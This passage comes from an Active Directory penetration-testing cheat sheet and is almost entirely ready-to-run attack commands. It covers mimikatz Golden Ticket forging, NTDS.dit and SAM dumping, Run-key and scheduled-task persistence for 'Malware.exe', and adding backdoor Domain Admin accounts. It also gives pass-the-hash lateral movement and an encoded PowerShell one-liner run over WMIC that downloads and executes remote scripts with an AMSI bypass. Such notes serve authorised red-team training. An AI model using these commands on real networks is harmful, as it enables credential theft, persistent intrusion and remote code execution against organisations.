Golden Ticket Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line"># To generate the TGT with NTLM</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 128 key</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># Inject TGT with Mimikatz</span><br><span class="line">mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Inject Ticket with Rebeus</span><br><span class="line">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd</span><br></pre></td></tr></table></figure><h2 id="5-20-子域将危害森林"><a href="#5-20-子域将危害森林" class="headerlink" title="5.20 子域将危害森林"></a>5.20 子域将危害森林</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC</span><br><span class="line"></span><br><span class="line">Tree = Set of domains using same name space (DNS Name)</span><br><span class="line"></span><br><span class="line">Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.</span><br><span class="line"></span><br><span class="line">Forest = Largest Structure composed of all trees.</span><br><span class="line"></span><br><span class="line">Most trees are linked with dual sided trust relationships to allow for sharing of resources.</span><br><span class="line"></span><br><span class="line">By default the first domain created if the Forest Root.</span><br><span class="line"></span><br><span class="line">Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create </span><br><span class="line"></span><br><span class="line">Covert-NameToSid target.domain.com\krbtgt</span><br><span class="line">S-1-5-21-2941561648-383941485-1389968811-502</span><br><span class="line"></span><br><span class="line">Replace 502 with 519 to represent Enterprise Admins</span><br><span class="line"></span><br><span class="line">Create golden ticket and attack parent domain. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This will not work if there is SID Filtering in place for respective target domain.</span><br><span class="line"></span><br><span class="line">harmj0ys article explains it best. </span><br><span class="line"></span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</span><br></pre></td></tr></table></figure><h2 id="5-21-Dump-NTDS-dit"><a href="#5-21-Dump-NTDS-dit" class="headerlink" title="5.21 Dump NTDS.dit"></a>5.21 Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\vssadmin create shadow /for=C:</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM</span><br><span class="line">.</span><br><span class="line">reg SAVE HKLM\SYSTEM c:\SYS</span><br><span class="line">vssadmin delete shadows /for= [/oldest | /all | /shadow=]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit</span><br></pre></td></tr></table></figure><h2 id="5-22-SeBackupPrivlege-Dump-NTDS-dit"><a href="#5-22-SeBackupPrivlege-Dump-NTDS-dit" class="headerlink" title="5.22 SeBackupPrivlege - Dump NTDS.dit"></a>5.22 SeBackupPrivlege - Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is disabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Set-SeBackupPrivilege</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is enabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite</span><br><span class="line">Copied 12582912 bytes</span><br><span class="line"></span><br><span class="line">Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit </span><br><span class="line"></span><br><span class="line">Remember and not use C:\Windows\ntds\ntds.dit</span><br><span class="line"></span><br><span class="line">reg.exe save hklm\system c:\m0chan\SYSTEM.bak</span><br></pre></td></tr></table></figure><h1 id="0x06-权限维持"><a href="#0x06-权限维持" class="headerlink" title="0x06 权限维持"></a>0x06 权限维持</h1><h2 id="6-1-SSH-Shuttle"><a href="#6-1-SSH-Shuttle" class="headerlink" title="6.1 SSH Shuttle"></a>6.1 SSH Shuttle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot;</span><br></pre></td></tr></table></figure><h2 id="6-2-SharPersist"><a href="#6-2-SharPersist" class="headerlink" title="6.2 SharPersist"></a>6.2 SharPersist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/fireeye/SharPersist</span><br><span class="line"></span><br><span class="line">C# Libary Designed by FireEye to aid with Persistance using various techniques such as </span><br><span class="line"></span><br><span class="line">KeePass Backdoor</span><br><span class="line">Reg Key</span><br><span class="line">Sch Task Backdoor</span><br><span class="line">Startup Folder (Link File)</span><br><span class="line">Service Backdoor</span><br><span class="line"></span><br><span class="line">See there github linked above for full Syntax, very cool work</span><br></pre></td></tr></table></figure><h2 id="6-3-SharpDoor"><a href="#6-3-SharpDoor" class="headerlink" title="6.3 SharpDoor"></a>6.3 SharpDoor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/SharpDoor.git</span><br><span class="line"></span><br><span class="line">SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.</span><br><span class="line"></span><br><span class="line">execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe</span><br></pre></td></tr></table></figure><h2 id="6-4-自动运行注册表"><a href="#6-4-自动运行注册表" class="headerlink" title="6.4 自动运行注册表"></a>6.4 自动运行注册表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br></pre></td></tr></table></figure><h2 id="6-5-Run-amp-Run-Once"><a href="#6-5-Run-amp-Run-Once" class="headerlink" title="6.5 Run &amp; Run Once"></a>6.5 Run &amp; Run Once</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v WindowsUpdate</span><br><span class="line">/t REG_SZ /d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="6-6-计划任务"><a href="#6-6-计划任务" class="headerlink" title="6.6 计划任务"></a>6.6 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.</span><br><span class="line"></span><br><span class="line">schtasks /create /sc minute /mo 1 /tn &quot;Malware&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe</span><br><span class="line"></span><br><span class="line">This will run Malware.exe every minute forever.</span><br><span class="line"></span><br><span class="line"># Run Malware.exe every day at 06:00am</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00</span><br><span class="line"></span><br><span class="line"># Runs a task each time the user&apos;s session is idle for 5 minutes.</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5</span><br><span class="line"></span><br><span class="line"># Runs a a task as SYSTEM when User Logs in.</span><br><span class="line">schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon</span><br></pre></td></tr></table></figure><h2 id="6-7-Windows启动文件夹"><a href="#6-7-Windows启动文件夹" class="headerlink" title="6.7 Windows启动文件夹"></a>6.7 Windows启动文件夹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This has been around for years as basically every version of Windows contains a startup folder. </span><br><span class="line"></span><br><span class="line">Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line"></span><br><span class="line">Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="6-8-EXE-DLL劫持"><a href="#6-8-EXE-DLL劫持" class="headerlink" title="6.8 EXE / DLL劫持"></a>6.8 EXE / DLL劫持</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Look for any missing DLL&apos;s or EXE&apos;s that common programs are calling on startup and over write them with your payload/malware.</span><br><span class="line"></span><br><span class="line">Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&apos;t break the execution.</span><br></pre></td></tr></table></figure><h2 id="6-9-添加用户帐号"><a href="#6-9-添加用户帐号" class="headerlink" title="6.9 添加用户帐号"></a>6.9 添加用户帐号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; m0chan /add /domain</span><br><span class="line">net localgroup &quot;Administrators&quot; /add</span><br><span class="line">net user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot;</span><br></pre></td></tr></table></figure><h4 id="6-10-Kerberos的持久性"><a href="#6-10-Kerberos的持久性" class="headerlink" title="6.10 Kerberos的持久性"></a>6.10 Kerberos的持久性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. </span><br><span class="line"></span><br><span class="line">They can be injected into session with mimikatz or Rebeus. </span><br><span class="line"></span><br><span class="line">But let&apos;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi </span><br><span class="line"></span><br><span class="line">SID is the domain SID</span><br><span class="line"></span><br><span class="line">Inject Ticket</span><br><span class="line"></span><br><span class="line">kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">Can also inject kirbi with Rebeus</span><br></pre></td></tr></table></figure><h1 id="0x07-横向运动"><a href="#0x07-横向运动" class="headerlink" title="0x07 横向运动"></a>0x07 横向运动</h1><h2 id="7-1-Plink"><a href="#7-1-Plink" class="headerlink" title="7.1 Plink"></a>7.1 Plink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br><span class="line"></span><br><span class="line">#Windows 1803 Built in SSH Client (By Default)</span><br><span class="line"></span><br><span class="line">ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br></pre></td></tr></table></figure><h2 id="7-2-Powershell端口转发"><a href="#7-2-Powershell端口转发" class="headerlink" title="7.2 Powershell端口转发"></a>7.2 Powershell端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip</span><br><span class="line"></span><br><span class="line">Permanent ^^</span><br><span class="line"></span><br><span class="line">Requires iphlpsvc service to be enabled</span><br><span class="line"></span><br><span class="line">fromport: the port number to listen on, e.g. 80</span><br><span class="line">fromip: the ip address to listen on, e.g. 192.168.1.1</span><br><span class="line">toport: the port number to forward to</span><br><span class="line">toip: the ip address to forward to</span><br></pre></td></tr></table></figure><h2 id="7-3-Invoke-SocksProxy"><a href="#7-3-Invoke-SocksProxy" class="headerlink" title="7.3 Invoke-SocksProxy"></a>7.3 Invoke-SocksProxy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/p3nt4/Invoke-SocksProxy/</span><br><span class="line"></span><br><span class="line">Local Socks4 Proxy on 1080</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-SocksProxy -bindPort 1080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reverse Socks Proxy on Remote Machine Port 1080</span><br><span class="line"></span><br><span class="line"># On the remote host: </span><br><span class="line"># Generate a private key and self signed cert</span><br><span class="line">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem</span><br><span class="line"></span><br><span class="line"># Get the certificate fingerprint to verify it:</span><br><span class="line">openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot;</span><br><span class="line"></span><br><span class="line"># Start the handler</span><br><span class="line">python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key</span><br><span class="line"></span><br><span class="line"># On the local host:</span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 </span><br><span class="line"></span><br><span class="line"># Go through the system proxy:</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy</span><br><span class="line"></span><br><span class="line"># Validate certificate</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &apos;93061FDB30D69A435ACF96430744C5CC5473D44E&apos;</span><br></pre></td></tr></table></figure><h2 id="7-4-Socat-for-Windows"><a href="#7-4-Socat-for-Windows" class="headerlink" title="7.4 Socat for Windows"></a>7.4 Socat for Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/StudioEtrange/socat-windows</span><br><span class="line"></span><br><span class="line">Generate SSL Cert for Encryption</span><br><span class="line">openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key</span><br><span class="line"></span><br><span class="line">Server : socat OPENSSL-LISTEN:443,cert=/cert.pem -</span><br><span class="line">Client : socat - OPENSSL:localhost:443</span><br><span class="line"></span><br><span class="line">#Port Forward</span><br><span class="line"></span><br><span class="line">socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443</span><br><span class="line"></span><br><span class="line">All SSL Connections will be redirected to 202.54.1.5:443</span><br><span class="line"></span><br><span class="line">#Non SSL Port Forward</span><br><span class="line">socat TCP-LISTEN:80,fork TCP:202.54.1.5:80</span><br></pre></td></tr></table></figure><h2 id="7-5-SharpExec"><a href="#7-5-SharpExec" class="headerlink" title="7.5 SharpExec"></a>7.5 SharpExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/anthemtotheego/SharpExec</span><br><span class="line"></span><br><span class="line">C# Implementation of Conventional Lateral Movement Techniques, such as </span><br><span class="line"></span><br><span class="line">-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&apos;s wmiexec.py tool.</span><br><span class="line"></span><br><span class="line">-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&apos;s smbexec.py tool.</span><br><span class="line"></span><br><span class="line">-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.</span><br><span class="line"></span><br><span class="line">-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.</span><br></pre></td></tr></table></figure><h2 id="7-6-安全套接字漏斗"><a href="#7-6-安全套接字漏斗" class="headerlink" title="7.6 安全套接字漏斗"></a>7.6 安全套接字漏斗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf</span><br><span class="line">#git clone https://github.com/securesocketfunneling/ssf.git</span><br><span class="line"></span><br><span class="line">Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself.</span><br></pre></td></tr></table></figure><h2 id="7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）"><a href="#7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）" class="headerlink" title="7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）"></a>7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html</span><br></pre></td></tr></table></figure><h2 id="7-8-CrackMapExec"><a href="#7-8-CrackMapExec" class="headerlink" title="7.8 CrackMapExec"></a>7.8 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/</span><br></pre></td></tr></table></figure><h2 id="7-9-WMIC-Spawn-Process"><a href="#7-9-WMIC-Spawn-Process" class="headerlink" title="7.9 WMIC Spawn Process"></a>7.9 WMIC Spawn Process</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot;</span><br></pre></td></tr></table></figure><h2 id="7-10-WinRS"><a href="#7-10-WinRS" class="headerlink" title="7.10 WinRS"></a>7.10 WinRS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs</span><br><span class="line"></span><br><span class="line">winrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt;  </span><br><span class="line"></span><br><span class="line">winrs /r:https://contoso.com command</span><br><span class="line"></span><br><span class="line">winrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command  </span><br><span class="line"></span><br><span class="line">winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share</span><br></pre></td></tr></table></figure><h2 id="7-11-Invoke-WMIExec-ps1"><a href="#7-11-Invoke-WMIExec-ps1" class="headerlink" title="7.11 Invoke-WMIExec.ps1"></a>7.11 Invoke-WMIExec.ps1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net user user pass /add /domain&quot;</span><br><span class="line"></span><br><span class="line">PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot;</span><br></pre></td></tr></table></figure><h2 id="7-12-Powershell调用命令（需要端口5985）"><a href="#7-12-Powershell调用命令（需要端口5985）" class="headerlink" title="7.12 Powershell调用命令（需要端口5985）"></a>7.12 Powershell调用命令（需要端口5985）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;pass&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;m0chan\user&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure><h2 id="7-13-PSExec"><a href="#7-13-PSExec" class="headerlink" title="7.13 PSExec"></a>7.13 PSExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\dc01.m0chanAD.local cmd.exe</span><br></pre></td></tr></table></figure><h2 id="7-14-Powershell-Remoting"><a href="#7-14-Powershell-Remoting" class="headerlink" title="7.14 Powershell Remoting"></a>7.14 Powershell Remoting</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object 